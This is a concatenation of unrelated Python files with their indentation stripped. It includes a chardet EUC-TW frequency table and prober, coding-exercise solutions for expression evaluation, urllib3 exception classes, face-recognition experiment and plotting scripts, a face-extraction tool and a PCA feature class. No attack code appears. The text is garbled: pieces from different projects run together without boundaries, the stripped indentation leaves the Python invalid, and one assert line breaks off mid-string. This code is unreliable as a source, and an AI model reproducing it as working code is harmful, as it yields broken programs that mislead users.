7936,7937,7938,7939,4254,1604,7940, 414,1865, 371,2587,4534,4535,3485,2016,3104,
4536,1708, 960,4255, 887, 389,2171,1536,1663,1721,7941,2228,4027,2351,2926,1580,
7942,7943,7944,1744,7945,2537,4537,4538,7946,4539,7947,2073,7948,7949,3592,3380,
2882,4256,7950,4257,2640,3381,2802, 673,2703,2460, 709,3486,4028,3593,4258,7951,
1148, 502, 634,7952,7953,1204,4540,3594,1575,4541,2613,3717,7954,3718,3105, 948,
3232, 121,1745,3837,1110,7955,4259,3063,2509,3009,4029,3719,1151,1771,3838,1488,
4030,1986,7956,2433,3487,7957,7958,2093,7959,4260,3839,1213,1407,2803, 531,2737,
2538,3233,1011,1537,7960,2769,4261,3106,1061,7961,3720,3721,1866,2883,7962,2017,
120,4262,4263,2062,3595,3234,2309,3840,2668,3382,1954,4542,7963,7964,3488,1047,
2704,1266,7965,1368,4543,2845, 649,3383,3841,2539,2738,1102,2846,2669,7966,7967,
1999,7968,1111,3596,2962,7969,2488,3842,3597,2804,1854,3384,3722,7970,7971,3385,
2410,2884,3304,3235,3598,7972,2569,7973,3599,2805,4031,1460, 856,7974,3600,7975,
2885,2963,7976,2886,3843,7977,4264, 632,2510, 875,3844,1697,3845,2291,7978,7979,
4544,3010,1239, 580,4545,4265,7980, 914, 936,2074,1190,4032,1039,2123,7981,7982,
7983,3386,1473,7984,1354,4266,3846,7985,2172,3064,4033, 915,3305,4267,4268,3306,
1605,1834,7986,2739, 398,3601,4269,3847,4034, 328,1912,2847,4035,3848,1331,4270,
3011, 937,4271,7987,3602,4036,4037,3387,2160,4546,3388, 524, 742, 538,3065,1012,
7988,7989,3849,2461,7990, 658,1103, 225,3850,7991,7992,4547,7993,4548,7994,3236,
1243,7995,4038, 963,2246,4549,7996,2705,3603,3161,7997,7998,2588,2327,7999,4550,
8000,8001,8002,3489,3307, 957,3389,2540,2032,1930,2927,2462, 870,2018,3604,1746,
2770,2771,2434,2463,8003,3851,8004,3723,3107,3724,3490,3390,3725,8005,1179,3066,
8006,3162,2373,4272,3726,2541,3163,3108,2740,4039,8007,3391,1556,2542,2292, 977,
2887,2033,4040,1205,3392,8008,1765,3393,3164,2124,1271,1689, 714,4551,3491,8009,
2328,3852, 533,4273,3605,2181, 617,8010,2464,3308,3492,2310,8011,8012,3165,8013,
8014,3853,1987, 618, 427,2641,3493,3394,8015,8016,1244,1690,8017,2806,4274,4552,
8018,3494,8019,8020,2279,1576, 473,3606,4275,3395, 972,8021,3607,8022,3067,8023,
8024,4553,4554,8025,3727,4041,4042,8026, 153,4555, 356,8027,1891,2888,4276,2143,
408, 803,2352,8028,3854,8029,4277,1646,2570,2511,4556,4557,3855,8030,3856,4278,
8031,2411,3396, 752,8032,8033,1961,2964,8034, 746,3012,2465,8035,4279,3728, 698,
4558,1892,4280,3608,2543,4559,3609,3857,8036,3166,3397,8037,1823,1302,4043,2706,
3858,1973,4281,8038,4282,3167, 823,1303,1288,1236,2848,3495,4044,3398, 774,3859,
8039,1581,4560,1304,2849,3860,4561,8040,2435,2161,1083,3237,4283,4045,4284, 344,
1173, 288,2311, 454,1683,8041,8042,1461,4562,4046,2589,8043,8044,4563, 985, 894,
8045,3399,3168,8046,1913,2928,3729,1988,8047,2110,1974,8048,4047,8049,2571,1194,
425,8050,4564,3169,1245,3730,4285,8051,8052,2850,8053, 636,4565,1855,3861, 760,
1799,8054,4286,2209,1508,4566,4048,1893,1684,2293,8055,8056,8057,4287,4288,2210,
479,8058,8059, 832,8060,4049,2489,8061,2965,2490,3731, 990,3109, 627,1814,2642,
4289,1582,4290,2125,2111,3496,4567,8062, 799,4291,3170,8063,4568,2112,1737,3013,
1018, 543, 754,4292,3309,1676,4569,4570,4050,8064,1489,8065,3497,8066,2614,2889,
4051,8067,8068,2966,8069,8070,8071,8072,3171,4571,4572,2182,1722,8073,3238,3239,
1842,3610,1715, 481, 365,1975,1856,8074,8075,1962,2491,4573,8076,2126,3611,3240,
433,1894,2063,2075,8077, 602,2741,8078,8079,8080,8081,8082,3014,1628,3400,8083,
3172,4574,4052,2890,4575,2512,8084,2544,2772,8085,8086,8087,3310,4576,2891,8088,
4577,8089,2851,4578,4579,1221,2967,4053,2513,8090,8091,8092,1867,1989,8093,8094,
8095,1895,8096,8097,4580,1896,4054, 318,8098,2094,4055,4293,8099,8100, 485,8101,
938,3862, 553,2670, 116,8102,3863,3612,8103,3498,2671,2773,3401,3311,2807,8104,
3613,2929,4056,1747,2930,2968,8105,8106, 207,8107,8108,2672,4581,2514,8109,3015,
890,3614,3864,8110,1877,3732,3402,8111,2183,2353,3403,1652,8112,8113,8114, 941,
2294, 208,3499,4057,2019, 330,4294,3865,2892,2492,3733,4295,8115,8116,8117,8118,
2515,1613,4582,8119,3312,3866,2516,8120,4058,8121,1637,4059,2466,4583,3867,8122,
2493,3016,3734,8123,8124,2192,8125,8126,2162,8127,8128,8129,8130,8131,8132,8133,
8134,8135,8136,8137,8138,8139,8140,8141,8142,8143,8144,8145,8146,8147,8148,8149,
8150,8151,8152,8153,8154,8155,8156,8157,8158,8159,8160,8161,8162,8163,8164,8165,
8166,8167,8168,8169,8170,8171,8172,8173,8174,8175,8176,8177,8178,8179,8180,8181,
8182,8183,8184,8185,8186,8187,8188,8189,8190,8191,8192,8193,8194,8195,8196,8197,
8198,8199,8200,8201,8202,8203,8204,8205,8206,8207,8208,8209,8210,8211,8212,8213,
8214,8215,8216,8217,8218,8219,8220,8221,8222,8223,8224,8225,8226,8227,8228,8229,
8230,8231,8232,8233,8234,8235,8236,8237,8238,8239,8240,8241,8242,8243,8244,8245,
8246,8247,8248,8249,8250,8251,8252,8253,8254,8255,8256,8257,8258,8259,8260,8261,
8262,8263,8264,8265,8266,8267,8268,8269,8270,8271,8272,8273,8274,8275,8276,8277,
8278,8279,8280,8281,8282,8283,8284,8285,8286,8287,8288,8289,8290,8291,8292,8293,
8294,8295,8296,8297,8298,8299,8300,8301,8302,8303,8304,8305,8306,8307,8308,8309,
8310,8311,8312,8313,8314,8315,8316,8317,8318,8319,8320,8321,8322,8323,8324,8325,
8326,8327,8328,8329,8330,8331,8332,8333,8334,8335,8336,8337,8338,8339,8340,8341,
8342,8343,8344,8345,8346,8347,8348,8349,8350,8351,8352,8353,8354,8355,8356,8357,
8358,8359,8360,8361,8362,8363,8364,8365,8366,8367,8368,8369,8370,8371,8372,8373,
8374,8375,8376,8377,8378,8379,8380,8381,8382,8383,8384,8385,8386,8387,8388,8389,
8390,8391,8392,8393,8394,8395,8396,8397,8398,8399,8400,8401,8402,8403,8404,8405,
8406,8407,8408,8409,8410,8411,8412,8413,8414,8415,8416,8417,8418,8419,8420,8421,
8422,8423,8424,8425,8426,8427,8428,8429,8430,8431,8432,8433,8434,8435,8436,8437,
8438,8439,8440,8441,8442,8443,8444,8445,8446,8447,8448,8449,8450,8451,8452,8453,
8454,8455,8456,8457,8458,8459,8460,8461,8462,8463,8464,8465,8466,8467,8468,8469,
8470,8471,8472,8473,8474,8475,8476,8477,8478,8479,8480,8481,8482,8483,8484,8485,
8486,8487,8488,8489,8490,8491,8492,8493,8494,8495,8496,8497,8498,8499,8500,8501,
8502,8503,8504,8505,8506,8507,8508,8509,8510,8511,8512,8513,8514,8515,8516,8517,
8518,8519,8520,8521,8522,8523,8524,8525,8526,8527,8528,8529,8530,8531,8532,8533,
8534,8535,8536,8537,8538,8539,8540,8541,8542,8543,8544,8545,8546,8547,8548,8549,
8550,8551,8552,8553,8554,8555,8556,8557,8558,8559,8560,8561,8562,8563,8564,8565,
8566,8567,8568,8569,8570,8571,8572,8573,8574,8575,8576,8577,8578,8579,8580,8581,
8582,8583,8584,8585,8586,8587,8588,8589,8590,8591,8592,8593,8594,8595,8596,8597,
8598,8599,8600,8601,8602,8603,8604,8605,8606,8607,8608,8609,8610,8611,8612,8613,
8614,8615,8616,8617,8618,8619,8620,8621,8622,8623,8624,8625,8626,8627,8628,8629,
8630,8631,8632,8633,8634,8635,8636,8637,8638,8639,8640,8641,8642,8643,8644,8645,
8646,8647,8648,8649,8650,8651,8652,8653,8654,8655,8656,8657,8658,8659,8660,8661,
8662,8663,8664,8665,8666,8667,8668,8669,8670,8671,8672,8673,8674,8675,8676,8677,
8678,8679,8680,8681,8682,8683,8684,8685,8686,8687,8688,8689,8690,8691,8692,8693,
8694,8695,8696,8697,8698,8699,8700,8701,8702,8703,8704,8705,8706,8707,8708,8709,
8710,8711,8712,8713,8714,8715,8716,8717,8718,8719,8720,8721,8722,8723,8724,8725,
8726,8727,8728,8729,8730,8731,8732,8733,8734,8735,8736,8737,8738,8739,8740,8741)
from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import EUCTWDistributionAnalysis
from .mbcssm import EUCTWSMModel
class EUCTWProber(MultiByteCharSetProber):
def __init__(self):
MultiByteCharSetProber.__init__(self)
self._mCodingSM = CodingStateMachine(EUCTWSMModel)
self._mDistributionAnalyzer = EUCTWDistributionAnalysis()
self.reset()
def get_charset_name(self):
return "EUC-TW"
class Solution:
def evalRPN(self, tokens):
return self.eval_postfix(tokens)
def eval_postfix(self, post):
stk = []
for elt in post:
if elt.strip("-").isdigit():
stk.append(int(elt))
else:
b = stk.pop()
a = stk.pop()
if elt == "+":
stk.append(a+b)
elif elt == "-":
stk.append(a-b)
elif elt == "*":
stk.append(a*b)
else:
stk.append(self.__div(a, b))
if stk:
return stk[-1]
return 0
def __div(self, a, b):
sign = 1
if a*b < 0:
sign = -1
return abs(a)/abs(b)*sign
class Solution(object):
def __init__(self, N, M):
self.f = [0 for _ in xrange(N + 1)]
self.V = [[] for _ in xrange(N + 1)]
self.E = []
def solve(self, cipher):
N, M, E = cipher
for e in E:
u, v = e
self.E.append([u, v])
self.V[u].append(v)
self.V[v].append(u)
self.get_sum(1, 0)
result = 0
for i in xrange(2, N + 1):
if self.f[i] % 2 == 0:
result += 1
return result
def get_sum(self, cur, pi):
if self.f[cur] == 0:
for nigh in self.V[cur]:
if nigh != pi:
self.f[cur] += self.get_sum(nigh, cur)
self.f[cur] += 1
return self.f[cur]
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N, M = map(int, f.readline().strip().split(' '))
solution = Solution(N, M)
E = []
for t in xrange(M):
E.append(map(int, f.readline().strip().split(' ')))
cipher = N, M, E
s = "%s\n" % (solution.solve(cipher))
print s,
cpp_examples = [
("wimax-simple", "True", "True"),
("wimax-ipv4", "True", "True"),
("wimax-multicast", "True", "True"),
]
python_examples = []
class HTTPError(Exception):
"Base exception used by this module."
pass
class PoolError(HTTPError):
"Base exception for errors caused within a pool."
def __init__(self, pool, message):
self.pool = pool
HTTPError.__init__(self, "%s: %s" % (pool, message))
def __reduce__(self):
return self.__class__, (None, self.url)
class SSLError(HTTPError):
"Raised when SSL certificate fails in an HTTPS connection."
pass
class DecodeError(HTTPError):
"Raised when automatic decoding based on Content-Type fails."
pass
class MaxRetryError(PoolError):
"Raised when the maximum number of retries is exceeded."
def __init__(self, pool, url, reason=None):
self.reason = reason
message = "Max retries exceeded with url: %s" % url
if reason:
message += " (Caused by %s: %s)" % (type(reason), reason)
else:
message += " (Caused by redirect)"
PoolError.__init__(self, pool, message)
self.url = url
class HostChangedError(PoolError):
"Raised when an existing pool gets a request for a foreign host."
def __init__(self, pool, url, retries=3):
message = "Tried to open a foreign host with url: %s" % url
PoolError.__init__(self, pool, message)
self.url = url
self.retries = retries
class TimeoutError(PoolError):
"Raised when a socket timeout occurs."
pass
class EmptyPoolError(PoolError):
"Raised when a pool runs out of connections and no more are allowed."
pass
class ClosedPoolError(PoolError):
"Raised when a request enters a pool after the pool has been closed."
pass
class LocationParseError(ValueError, HTTPError):
"Raised when get_host or similar fails to parse the URL input."
def __init__(self, location):
message = "Failed to parse: %s" % location
HTTPError.__init__(self, message)
self.location = location
from experiment_setup import *
import numpy as np
from expr.kernelpca_ski import KPCA
from util.commons_util.decorators.general import print_func_name
class Plotter(object):
def __init__(self):
pass
def _plot(self, models, dist_metric=EuclideanDistance()):
expr = Experiment(froze_shuffle=True)
for model in models:
cv = expr.experiment(model, threshold_up=1, debug=False, dist_metric=dist_metric)
expr.plot_roc(cv)
expr.show_plot()
def _simple_run(self, models, dist_metric=EuclideanDistance()):
expr = Experiment(froze_shuffle=True)
for model in models:
expr.experiment(model, threshold_up=0, debug=False, dist_metric=dist_metric)
class PlotterPCA(Plotter):
def plot_components(self):
models = []
for num_component in xrange(10, 150, 30):
models.append(PCA(num_component))
self._plot(models)
def plot_energy(self):
models = []
class PCA_energy(PCA):
def short_name(self):
return "PCA: %.2f%%" % (self.energy_percentage * 100)
for num_component in xrange(20, 110, 40):
models.append(PCA_energy(num_component))
self._plot(models)
class PlotterFisher(Plotter):
def plot_components(self):
models = []
for num_components in xrange(1, 16, 3):
models.append(Fisherfaces(num_components))
self._plot(models)
class PlotterKnn(object):
def plot_kNN(self):
pca = PCA(40)
expr = Experiment()
plt.figure("PCA precision for different k in kNN")
plt.xlabel("k of kNN")
plt.ylabel("precision")
xys = []
for k in xrange(1, 41):
cv = expr.experiment(pca, threshold_up=0, kNN_k=k, debug=False)
xys.append((k, cv.validation_results[0].precision))
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])
plt.show()
class PlotterLgbphs(Plotter):
def _plot(self, models):
super(PlotterLgbphs, self)._plot(models, HistogramIntersection())
@print_func_name
def plot_lbp_algorihtms(self):
class LgbphsSub(LGBPHS2):
def short_name(self):
return "%s" % self.feature.model2.lbp_operator.short_name()
models = []
for lbp in (OriginalLBP(), ExtendedLBP(radius=6)):
models.append(LgbphsSub(lbp_operator=lbp))
self._plot(models)
@print_func_name
def plot_gabor(self):
class LgbphsSub(LGBPHS2):
def short_name(self):
return "LGBPHS"
models = [LgbphsSub(lbp_operator=ExtendedLBP(3)),
SpatialHistogram(lbp_operator=ExtendedLBP(3))
]
self._plot(models)
@print_func_name
def plot_scales(self, r=xrange(1, 10, 4)):
class LgbphsSub(LGBPHS2):
def short_name(self):
return "scale: %s" % self.feature.model1.scale_cnt
self._plot([LgbphsSub(n_scale=i, lbp_operator=ExtendedLBP(3)) for i in r])
@print_func_name
def get_precision_scales(self, r=xrange(1, 10, 4)):
self._simple_run([LGBPHS2(n_scale=i, lbp_operator=ExtendedLBP(3)) for i in r])
@print_func_name
def plot_orientations(self, r=xrange(2, 9, 3)):
class LgbphsSub(LGBPHS2):
def short_name(self):
return "orient: %s" % self.feature.model1.orient_cnt
self._plot([LgbphsSub(n_orient=i, lbp_operator=ExtendedLBP(3)) for i in r])
@print_func_name
def get_precisions_orientations(self, r=xrange(2, 9, 3)):
self._simple_run([LGBPHS2(n_orient=i, lbp_operator=ExtendedLBP(3)) for i in r])
def plot_histogram(self):
pass
class PlotterKernelPCA(Plotter):
def plot_rbf(self, r=(10000.0 / (200 * 200), 0.5, 0.75, 1.0)):
class KPCASub(KPCA):
def short_name(self):
return "%s, gamma=%.4f" % (self._kernel, self._gamma)
self._plot([KPCASub(kernel="rbf", gamma=i) for i in r])
def plot_poly_degree(self):
models = []
class KPCA_poly(KPCA):
def short_name(self):
return "poly (degree: %d)" % self._degree
for degree in xrange(1, 6):
models.append(KPCA_poly(50, "poly", degree))
self._plot(models)
def plot_poly_degree_precisions(self):
expr = Experiment(froze_shuffle=True)
plt.figure("Kernel PCA precision for different number of degrees")
plt.xlabel("number of degrees")
plt.ylabel("precision")
class KPCA_poly(KPCA):
def short_name(self):
return "poly (degree: %d)" % self._degree
xys = []
for degree in (1, 4):
cv = expr.experiment(KPCA_poly(10, "poly", degree), threshold_up=0, debug=False)
xys.append((degree, cv.validation_results[0].precision))
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])
plt.show()
def plot_kernels(self):
kernels = ["poly", "sigmoid", "cosine", "rbf"]
models = []
for kernel in kernels:
models.append(KPCA(50, kernel))
self._plot(models)
def plot_poly_coef0(self, r=(0.0, 20.0, 40.0, 60.0, 80.0)):
class KPCA_coef0(KPCA):
def short_name(self):
return "poly (coef0: %.2f)" % self._coef0
self._plot([KPCA_coef0(kernel="poly", coef0=i) for i in r])
def plot_poly_gamma(self, r=(10.0, 40.0, 70.0, 100.0, 130.0)):
class KPCA_gamma(KPCA):
def short_name(self):
return "poly (gamma: %.2f)" % self._gamma
self._plot([KPCA_gamma(kernel="poly", gamma=i) for i in r])
def plot_sigmoid(self, r=(10.0, 20.0, 30.0, 40.0, 50.0)):
class KPCA_sigmoid(KPCA):
def short_name(self):
return "sigmoid (gamma: %.2f)" % self._gamma
self._plot([KPCA_sigmoid(kernel="sigmoid", gamma=i) for i in r])
class PlotterEnsemble(Plotter):
def plot_fisher(self):
expr = FeaturesEnsembleExperiment(froze_shuffle=True)
plt.axis([0, 0.5, 0.9, 1.001])
class LbpFisherSub(LbpFisher):
def short_name(self):
return "EnsembleLbpFisher"
features = [LbpFisherSub(ExtendedLBP(i)) for i in (3, 6, 10, 11, 14, 15, 19)]
cv = expr.experiment(features, threshold_up=1, debug=False)
expr.plot_roc(cv)
features = [LbpFisher(ExtendedLBP(11))]
cv = expr.experiment(features, threshold_up=1, debug=False)
expr.plot_roc(cv)
class FisherfacesSub(Fisherfaces):
def short_name(self):
return "Fisher"
features = [FisherfacesSub(14)]
cv = expr.experiment(features, threshold_up=1, debug=False)
expr.plot_roc(cv)
expr.show_plot()
class IdentityFold(Identity):
def __init__(self, k):
self.k = k
super(IdentityFold, self).__init__()
def short_name(self):
return "folds - %d" % self.k
class PCAFold(PCA):
def __init__(self, k, num_components):
self.k = k
super(PCAFold, self).__init__(num_components)
def short_name(self):
return "folds - %d" % self.k
class FisherFold(Fisherfaces):
def __init__(self, k, num_components):
self.k = k
super(FisherFold, self).__init__(num_components)
def short_name(self):
return "folds - %d" % self.k
class Plotter1NN(Plotter):
def plot_1NN(self):
expr = Experiment()
for number_folds in xrange(2, 12, 1):
cv = expr.experiment(IdentityFold(number_folds), threshold_up=1, number_folds=number_folds, debug=False)
expr.plot_roc(cv)
expr.show_plot()
def plot_1NN_PCA(self):
expr = Experiment()
class PCASub(PCA):
def __init__(self, k, num_components):
self.k = k
super(PCASub, self).__init__(num_components)
def short_name(self):
return "folds - %d" % self.k
for number_folds in xrange(2, 12, 1):
cv = expr.experiment(PCASub(number_folds, 50), threshold_up=1, number_folds=number_folds, debug=False)
expr.plot_roc(cv)
expr.show_plot()
def plot_1NN_Identity_Precisions(self):
expr = Experiment(froze_shuffle=True)
plt.figure("No reduction, precision for different number of folds")
plt.xlabel("number of folds")
plt.ylabel("precision")
xys = []
for number_folds in xrange(2, 12, 1):
cv = expr.experiment(IdentityFold(number_folds), threshold_up=0, number_folds=number_folds, debug=False)
xys.append((number_folds, cv.validation_results[0].precision))
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])
plt.show()
def plot_1NN_PCA_Precisions(self):
expr = Experiment(froze_shuffle=True)
plt.figure("PCA precision for different number of folds")
plt.xlabel("number of folds")
plt.ylabel("precision")
xys = []
for number_folds in xrange(2, 12, 1):
cv = expr.experiment(PCAFold(number_folds, 40), threshold_up=0, number_folds=number_folds, debug=False)
xys.append((number_folds, cv.validation_results[0].precision))
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])
plt.show()
def plot_1NN_fisher_precisions(self):
expr = Experiment(froze_shuffle=True)
plt.figure("Fisher precision for different number of folds")
plt.xlabel("number of folds")
plt.ylabel("precision")
xys = []
for number_folds in xrange(2, 12, 1):
cv = expr.experiment(FisherFold(number_folds, 14), threshold_up=0, number_folds=number_folds, debug=False)
xys.append((number_folds, cv.validation_results[0].precision))
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])
plt.show()
if __name__ == "__main__":
print __file__
import sys
from expr.weighted_hs import WeightedLGBPHS
from facerec_py.facerec.distance import *
from facerec_py.facerec.classifier import NearestNeighbor, SVM
from facerec_py.facerec.model import PredictableModel, FeaturesEnsemblePredictableModel
from facerec_py.facerec.validation import KFoldCrossValidation, shuffle
from facerec_py.facerec.visual import subplot
from facerec_py.facerec.util import minmax_normalize
from expr.read_dataset import read_images
import matplotlib.cm as cm
import matplotlib.pyplot as plt
from expr.feature import *
from util.commons_util.logger_utils.logger_factory import LoggerFactory
from scipy.interpolate import spline
import numpy as np
class Drawer(object):
def __init__(self, smooth=False):
plt.figure("ROC")
plt.axis([0, 0.5, 0.5, 1.001])
plt.xlabel('FPR')
plt.ylabel('TPR')
plt.rc('axes', color_cycle=['r', 'g', 'b', 'c', 'm', 'y', 'k',
'darkgreen', 'chocolate', 'darksalmon', 'darkseagreen', 'yellowgreen'])
self.is_smooth = smooth
self._rocs = []
def show(self):
plt.legend(handles=self._rocs)
plt.show()
def plot_roc(self, cv):
FPRs = [r.FPR for r in cv.validation_results]
TPRs = [r.TPR for r in cv.validation_results]
FPRs.append(0.0)
TPRs.append(0.0)
FPRs.append(1.0)
TPRs.append(1.0)
if self.is_smooth:
FPRs, TPRs = self.smooth(FPRs, TPRs)
roc, = plt.plot(FPRs, TPRs, label=cv.model.feature.short_name())
self._rocs.append(roc)
def smooth(self, x, y):
x = np.array(x)
y = np.array(y)
x, idx = np.unique(x, return_index=True)
y = y[idx]
x_sm = np.linspace(x.min(), x.max(), 60)
y_sm = spline(x, y, x_sm)
return x_sm, y_sm
class Experiment(object):
def __init__(self, smooth=False, froze_shuffle=False):
self.logger = LoggerFactory().getConsoleLogger("facerec")
self._drawer = Drawer(smooth)
self.X, self.y = shuffle(*self.read())
self.froze_shuffle = froze_shuffle
def read(self):
out_dir = None
if len(sys.argv) < 2:
print "USAGE: experiment_setup.py </path/to/images>"
sys.exit()
X, y = read_images(sys.argv[1])
X = np.asarray(X)
y = np.asarray(y)
return X, y
def plot_fisher_original(self, X, model):
E = []
for i in xrange(min(model.feature.eigenvectors.shape[1], 16)):
e = model.feature.eigenvectors[:, i].reshape(X[0].shape)
E.append(minmax_normalize(e, 0, 255, dtype=np.uint8))
subplot(title="Fisherfaces", images=E, rows=4, cols=4, sptitle="Fisherface", colormap=cm.jet,
filename="fisherfaces.png")
plt.close()
def plot_fisher(self, X, model, r=3, c=5):
E = []
for i in xrange(min(model.feature.eigenvectors.shape[1], r*c)):
e = model.feature.eigenvectors[:, i].reshape(X[0].shape)
E.append(minmax_normalize(e, 0, 255, dtype=np.uint8))
subplot(title="Fisherface Components", images=E, rows=r, cols=c, sptitle="fisherface", colormap=cm.rainbow,
filename="fisherfaces.png")
plt.close()
def experiment(self, feature=Fisherfaces(), plot=None, dist_metric=EuclideanDistance(), threshold_up=0, kNN_k=1, number_folds=None, debug=True):
classifier = NearestNeighbor(dist_metric=dist_metric, k=kNN_k)
model = self._get_model(feature, classifier)
model.compute(self.X, self.y)
if plot:
plot(self.X, model)
if number_folds is None:
number_folds = len(np.unique(self.y))
if number_folds>15: number_folds = 10
cv = KFoldCrossValidation(model, k=number_folds, threshold_up=threshold_up, froze_shuffle=self.froze_shuffle, debug=debug)
cv.validate(self.X, self.y)
print cv
if debug:
self.logger.info("Cross validation completed; press any key on any image to continue")
cv2.waitKey(0)
cv2.destroyAllWindows()
return cv
def _get_model(self, feature, classifier):
return PredictableModel(feature=feature, classifier=classifier)
def show_plot(self):
self._drawer.show()
def plot_roc(self, cv):
self._drawer.plot_roc(cv)
class FeaturesEnsembleExperiment(Experiment):
def _get_model(self, features, classifier):
return FeaturesEnsemblePredictableModel(features, classifier)
def draw_roc(expr):
cv = expr.experiment(Fisherfaces(14), threshold_up=1)
expr.plot_roc(cv)
cv = expr.experiment(PCA(50), threshold_up=1)
expr.plot_roc(cv)
cv = expr.experiment(SpatialHistogram(), dist_metric=HistogramIntersection(), threshold_up=1)
expr.plot_roc(cv)
expr.show_plot()
def ensemble_lbp_fisher():
features = [LbpFisher(ExtendedLBP(i)) for i in (3, 6, 10, 11, 14, 15, 19)]
expr = FeaturesEnsembleExperiment()
expr.experiment(features, debug=False)
if __name__ == "__main__":
expr = Experiment(froze_shuffle=True)
class Solution:
def evaluateExpression(self, expression):
post = self.infix2postfix(expression)
return self.eval_postfix(post)
def infix2postfix(self, lst):
stk = []
post = []
for elt in lst:
if elt.isdigit():
post.append(elt)
else:
if elt == "(":
stk.append(elt)
elif elt == ")":
while stk and stk[-1] != "(":
post.append(stk.pop())
stk.pop()
else:
while stk and self.precedence(elt) <= self.precedence(stk[-1]):
post.append(stk.pop())
stk.append(elt)
while stk:
post.append(stk.pop())
return post
def eval_postfix(self, post):
stk = []
for elt in post:
if elt.isdigit():
stk.append(int(elt))
else:
b = stk.pop()
a = stk.pop()
if elt == "+":
stk.append(a+b)
elif elt == "-":
stk.append(a-b)
elif elt == "*":
stk.append(a*b)
else:
stk.append(a/b)
if stk:
return stk[-1]
return 0
def precedence(self, a):
if a in ("(", ")"):
return 0
if a in ("+", "-"):
return 1
if a in ("*", "/"):
return 2
return 3
if __name__ == "__main__":
t = [
"2", "*", "6", "-", "(",
"23", "+", "7", ")", "/",
"(", "1", "+", "2", ")"
]
assert Solution().evaluateExpression(list("1+5")) == 6
assert Solution().evaluateExpression(t)==2
class ExpressionTreeNode:
def __init__(self, symbol):
self.symbol = symbol
self.left, self.right = None, None
class Solution:
def build(self, expression):
post = self.infix2postfix(expression)
tree_node = self.postfix2tree(post)
return tree_node
def infix2postfix(self, expression):
post = []
op_stk = []
for elt in expression:
if elt.isdigit():
post.append(elt)
elif elt == "(":
op_stk.append(elt)
elif elt == ")":
while op_stk and op_stk[-1] != "(":
post.append(op_stk.pop())
op_stk.pop()
else:
while op_stk and self.precedence(op_stk[-1]) >= self.precedence(
elt):
post.append(op_stk.pop())
op_stk.append(elt)
while op_stk:
post.append(op_stk.pop())
return post
def postfix2tree(self, post):
tree_stk = []
for elt in post:
if elt.isdigit():
tree_stk.append(ExpressionTreeNode(elt))
else:
pi = ExpressionTreeNode(elt)
pi.right = tree_stk.pop()
pi.left = tree_stk.pop()
tree_stk.append(pi)
try:
return tree_stk.pop()
except IndexError:
return None
def precedence(self, elt):
if elt in ("(", ")"):
return 0
if elt in ("+", "-"):
return 1
if elt in ("*", "/"):
return 2
return 3
if __name__ == "__main__":
tree_ndoe = Solution().build(["2", "*", "6", "-", "(", "23", "+", "7", ")", "/", "(", "1", "+", "2", ")"])
assert tree_ndoe.symbol == "-
import sys
sys.path.append("../..")
import cv2
from facedet.detector import SkinFaceDetector
import numpy as np
import os
def extract_faces(src_dir, dst_dir, detector, face_sz = (130,130)):
if not os.path.exists(dst_dir):
try:
os.mkdir(dst_dir)
except:
raise OSError("Can't create destination directory (%s)!" % (dst_dir))
for dirname, dirnames, filenames in os.walk(src_dir):
for subdir in dirnames:
src_subdir = os.path.join(dirname, subdir)
dst_subdir = os.path.join(dst_dir,subdir)
if not os.path.exists(dst_subdir):
try:
os.mkdir(dst_subdir)
except:
raise OSError("Can't create destination directory (%s)!" % (dst_dir))
for filename in os.listdir(src_subdir):
name, ext = os.path.splitext(filename)
src_fn = os.path.join(src_subdir,filename)
img = cv2.imread(src_fn)
rects = detector.detect(img)
for i,rect in enumerate(rects):
x0,y0,x1,y1 = rect
face = img[y0:y1,x0:x1]
face = cv2.resize(face, face_sz, interpolation = cv2.INTER_CUBIC)
print os.path.join(dst_subdir, "%s_%s_%d%s" % (subdir, name,i,ext))
cv2.imwrite(os.path.join(dst_subdir, "%s_%s_%d%s" % (subdir, name,i,ext)), face)
if __name__ == "__main__":
if len(sys.argv) < 3:
print "usage: python extract_faces.py <src_dir> <dst_dir>"
sys.exit()
src_dir = sys.argv[1]
dst_dir = sys.argv[2]
detector = SkinFaceDetector(threshold=0.3, cascade_fn="/home/philipp/projects/opencv2/OpenCV-2.3.1/data/haarcascades/haarcascade_frontalface_alt2.xml")
extract_faces(src_dir=src_dir, dst_dir=dst_dir, detector=detector)
import numpy as np
class AbstractFeature(object):
def compute(self, X, y):
raise NotImplementedError("Every AbstractFeature must implement the compute method.")
def extract(self, X):
raise NotImplementedError("Every AbstractFeature must implement the extract method.")
def save(self):
raise NotImplementedError("Not implemented yet (TODO).")
def load(self):
raise NotImplementedError("Not implemented yet (TODO).")
def __repr__(self):
return self.short_name()
def short_name(self):
return self.__class__.__name__
class Identity(AbstractFeature):
def __init__(self):
AbstractFeature.__init__(self)
def compute(self, X, y):
return X
def extract(self, X):
return X
def __repr__(self):
return "Identity"
from facerec_py.facerec.util import asColumnMatrix
from facerec_py.facerec.operators import ChainOperator, CombineOperator
class PCA(AbstractFeature):
def __init__(self, num_components=0):
AbstractFeature.__init__(self)
self._num_components = num_components
self._total_energy = 0
self._mean = None
self._eigenvectors = None
self._eigenvalues = None
def compute(self, X, y):
XC = asColumnMatrix(X)
y = np.asarray(y)
if self._num_components <= 0 or (self._num_components > XC.shape[1] - 1):
self._num_components = XC.shape[1] - 1
self._mean = XC.mean(axis=1).reshape(-1, 1)
XC = XC - self._mean
self._eigenvectors, self._eigenvalues, variances = np.linalg.svd(XC, full_matrices=False)
self._eigenvalues = np.power(self._eigenvalues, 2) / XC.shape[1]
self._total_energy = np.sum(self._eigenvalues)
idx = np.argsort(-self._eigenvalues)
self._eigenvalues, self._eigenvectors = self._eigenvalues[idx], self._eigenvectors[:, idx]
self._eigenvectors = self._eigenvectors[:, :self._num_components].copy()
self._eigenvalues = self._eigenvalues[:self._num_components].copy()
features = []
for x in X:
xp = self.project(x.reshape(-1, 1))
features.append(xp)
return features
def extract(self, X):
X = np.asarray(X).reshape(-1, 1)
return self.project(X)
def project(self, X):
X = X - self._mean
return np.dot(self._eigenvectors.T, X)
def reconstruct(self, X):
X = np.dot(self._eigenvectors, X)
return X + self._mean
@property
def num_components(self):
return self._num_components
@property
def eigenvalues(self):
return self._eigenvalues
@property
def eigenvectors(self):
